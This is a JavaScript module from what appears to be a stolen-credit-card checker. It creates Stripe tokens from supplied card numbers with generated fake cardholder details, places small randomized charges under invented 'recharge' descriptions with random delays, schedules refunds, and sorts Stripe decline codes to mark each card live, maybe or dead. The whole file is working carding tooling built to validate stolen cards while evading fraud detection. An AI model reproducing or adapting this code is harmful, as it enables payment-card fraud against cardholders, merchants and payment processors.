const makeStripe = require('../makeStripe.js')
const genBicoData = require('../genBicoData.js')
const scheduleRefund = require('../scheduleRefund.js')
const config = require('../../config.js')

// Stripe instance with SK
const $stripe = makeStripe();

// gets an Info Object already parsed by ccCheckRequestMany
async function infoCheckLive (_infoObj = {}) {

    if (_infoObj._valid === 'Não') {
        return {
            data: null,
            error: {
                code: 406,
                text: 'Invalid info.'
            }
        }
    }

    if (_infoObj._live !== 'Check') {
        return {
            data: null,
            error: {
                code: 406,
                text: 'Info already checked.'
            }
        }
    }

    let _cus = _infoObj._cus;
    
    if (!_cus.name) {
        _cus = genBicoData();
    }

    try {

        await _delayRandom('...delay a bit before create Token...')

        let token = await $stripe.tokens.create({
            card: {
                number: _infoObj.number,
                exp_month: _infoObj.month,
                exp_year: _infoObj.year,
                cvc: _infoObj.cvv,
                name: _cus.holdername,
                address_line1: _cus.address,
                address_state: _cus.state,
                address_zip: _cus.cep,
                address_country: _cus.country
            }
        })

        await _delayRandom('...delay a bit before create Charge...')

        let charge = await $stripe.charges.create({
            source: token.id,
            amount: _getRandomAmount(),
            description: _getRandomDescription(),
            currency: 'brl',
            receipt_email: _cus.email,
            shipping: {
                name: _cus.name,
                address: {
                    line1: _cus.address,
                    country: _cus.country,
                    state: _cus.state,
                    postal_code: _cus.cep,
                }
            }
        })

        /////////////////////////
        scheduleRefund(charge.id)
        /////////////////////////

        return {
            error: null,
            data: {
                ..._infoObj,
                _cus,
                _live: 'Sim',
                _cashout: charge.amount,
                _chargeid: charge.id,
                _errorLive: null
            }
        }
    
    } catch (_err) {

        let _errType = _err.raw.type,
            _errCode = _err.raw.code,
            _errParam = _err.raw.param;

        let _declineCode = _err.raw.decline_code;

        const declineErrorCodes = {
            
            pass: [
                'incorrect_zip',
                'insufficient_funds',
                'currency_not_supported',
                'card_velocity_exceeded',
                'account_country_invalid_address',
                'amount_too_small',
                'authentication_required',
                'currency_not_supported',
                'invalid_amount',
                'withdrawal_count_limit_exceeded'
            ],

            maybe: [
                'offline_pin_required',
                'online_or_offline_pin_required',
                'security_violation',
                'revocation_of_authorization',
                'approve_with_id',
                'authentication_required'
            ]
        }

        const passErrorCodes = [ // card_declined ainda viu
            'balance_insufficient',
            'insufficient_funds',
            'email_invalid',
            'incorrect_address',
            'incorrect_zip',
            'postal_code_invalid'
        ]

        const neutralErrorCodes = [
            'invalid_charge_amount',
            'country_unsupported',
            'amount_too_large',
            'amount_too_small',
            'country_code_invalid',
            'duplicate_transaction',
            'try_again_later',
            'api_key_expired',
            'charge_already_captured',
            'charge_exceeds_source_limit',
            'idempotency_key_in_use',
            'invalid_source_usage',
            'livemode_mismatch',
            'order_creation_failed',
            'parameter_invalid_empty',
            'parameter_invalid_integer',
            'parameter_invalid_string_blank',
            'parameter_missing',
            'parameter_unknown',
            'parameters_exclusive',
            'platform_api_key_expired',
            'processing_error',
            'rate_limit',
            'resource_missing',
            'sensitive_data_access_expired',
            'testmode_charges_only',
            'tls_version_unsupported',
            'token_already_used',
            'token_in_use',
            'url_invalid',
            'lock_timeout'
        ]

        if (_declineCode) {

            if (declineErrorCodes
                .pass
                .includes(_declineCode)) {

                    return {
                        error: null,
                        data: {
                            ..._infoObj,
                            _cus,
                            _live: 'Sim',
                            _cashout: 'Não',
                            _chargeid: null,
                            _errorLive: _declineCode
                        }
                    }
            }

            if (declineErrorCodes
                .maybe
                .includes(_declineCode)) {
                
                    return {
                        error: null,
                        data: {
                            ..._infoObj,
                            _cus,
                            _live: 'Talvez',
                            _cashout: 'Não',
                            _chargeid: null,
                            _errorLive: _declineCode
                        }
                    }
            }
  
            return {
                error: null,
                data: {
                    ..._infoObj,
                    _cus,
                    _live: 'Não',
                    _cashout: 'Não',
                    _chargeid: null,
                    _errorLive: _declineCode
                }
            }
        }

        // if !_declineCode
        // continue...
        // barely...

        if (passErrorCodes.includes(_errCode)) {
            return {
                error: null,
                data: {
                    ..._infoObj,
                    _cus,
                    _live: 'Sim',
                    _cashout: 'Não',
                    _chargeid: null,
                    _errorLive: _errCode
                }
            }
        }

        if (neutralErrorCodes.includes(_errCode)) {
            return {
                data: null,
                error: {
                    code: _err.raw.statusCode,
                    text: `${_errType} > ${_errCode} > ${_errParam}`
                }
            }
        }

        // die
        return {
            error: null,
            data: {
                ..._infoObj,
                _cus,
                _live: 'Não',
                _cashout: 'Não',
                _chargeid: null,
                _errorLive: _errCode
            }
        }
    }
}

// export main method
module.exports = infoCheckLive;
 
// helper functions
function _delayRandom (_logTxt) {

    const min = config.minChargeDelay,
          max = config.maxChargeDelay

    let _rms = Math.floor(Math.random() * (max - min + 1)) + min;

    console.log(_logTxt, _rms)

    return new Promise(resolve => setTimeout(resolve, _rms))
}

function _getRandomAmount () {
    
    const min = config.minCashout,
          max = config.maxCashout

    let _randomBtw5e9 = Math.floor(
            Math.random() * (max - min + 1)) + min

    // to multiple of 10
    return Math.round(_randomBtw5e9 / 10) * 10
}

function _getRandomDescription () {
    
    let _types = [
        'recharge',
        'partial recharge',
        'adicional recharge',
        'gift recharge'
    ]

    let _fors = [
        'anonymous',
        'friend',
        'family member',
        'random person'
    ]

    let _scopes = [
        'cell-direct',
        'to-account'
    ]

    let _typeIndex = Math.floor(Math.random() * _types.length),
        _forIndex = Math.floor(Math.random() * _types.length),
        _scopeIndex = Math.floor(Math.random() * _scopes.length)

    let $type = _types[_typeIndex],
        $for = _fors[_forIndex],
        $scope = _scopes[_scopeIndex];

    return `${$type} for ${$for}: ${$scope}`
}
